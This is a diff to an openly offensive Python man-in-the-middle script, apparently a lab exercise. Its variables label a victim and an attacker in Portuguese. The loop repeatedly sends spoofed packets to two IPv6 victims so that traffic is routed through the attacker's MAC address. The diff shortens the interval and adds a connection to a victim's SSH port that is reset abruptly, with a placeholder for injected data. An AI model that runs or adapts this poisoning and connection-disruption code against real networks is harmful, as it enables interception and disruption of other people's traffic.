@@ -21,9 +21,19 @@ def mitm(ip_vitima01, ip_vitima02, mac_atacante):
 	while True:
 		send(pkt01, iface = 'enp4s0')
 		send(pkt02, iface = 'enp4s0')
-		time.sleep(5)
+		time.sleep(1)
 
-ipv6_vitima01 = "2001:db8:0:1:9406:f0c7:f712:84d"
+		s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
+		s.connect((ip_vitima01, 22))
+		l_onoff = 1
+		l_linger = 0
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', l_onoff, l_linger))
+		# send data here
+		s.close()
+
+		time.sleep(1)
+
+ipv6_vitima01 = "2001:db8:0:1:c966:e1f7:3ae8:76b9"
 ipv6_vitima02 = "2001:1bcd:123:1:ac02:ae48:93da:f43e"
 mac_atacante = "a4:1f:72:f5:90:50"
 
